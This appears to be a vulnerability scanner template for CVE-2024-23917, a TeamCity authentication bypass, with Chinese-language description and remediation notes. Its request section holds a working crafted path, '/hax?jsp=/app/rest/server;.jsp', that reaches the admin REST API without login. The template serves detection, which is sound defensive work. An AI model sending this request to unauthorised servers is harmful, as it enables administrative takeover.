id: CVE-2024-23917
info:
  name: TeamCity 权限绕过漏洞
  author: k3ppf0r
  severity: critical
  description: |
    据描述，该漏洞源于TeamCity存在代码缺陷，未经身份验证的攻击者能够通过构造特制的请求访问TeamCity服务器来绕过身份验证检查，并获得该TeamCity服务器的管理控制权限。
  reference:
    - 无
  remediation: |
    1. 官方已发布漏洞补丁及修复版本，请评估业务是否受影响后，酌情升级至安全版本。
    【备注】：建议您在升级前做好数据备份工作，避免出现意外。
    https://blog.jetbrains.com/teamcity/2024/02/critical-security-issue-affecting-teamcity-on-premises-cve-2024-23917/
    2. 临时缓解方案：
      在不影响正常系统功能和业务的前提下，避免开放至公网。
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cve-id: CVE-2024-23917
    cwe-id: CWE-306,CWE-288
    cpe: cpe:2.3:a:jetbrains:teamcity:*:*:*:*:*:*:*:*
  metadata:
    date: 2024-02-06
    version: |
      2017.1 <= TeamCity < 2023.11.3
  tags: cve,cve2024,TeamCity,rce

http:
  - raw:
      - |+
        GET /hax?jsp=/app/rest/server;.jsp HTTP/1.1
        Host: {{Hostname}}
        Upgrade-Insecure-Requests: 1
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.6312.58 Safari/537.36
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
        Accept-Encoding: gzip, deflate, br
        Accept-Language: zh-CN,zh;q=0.9
        Connection: close


    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
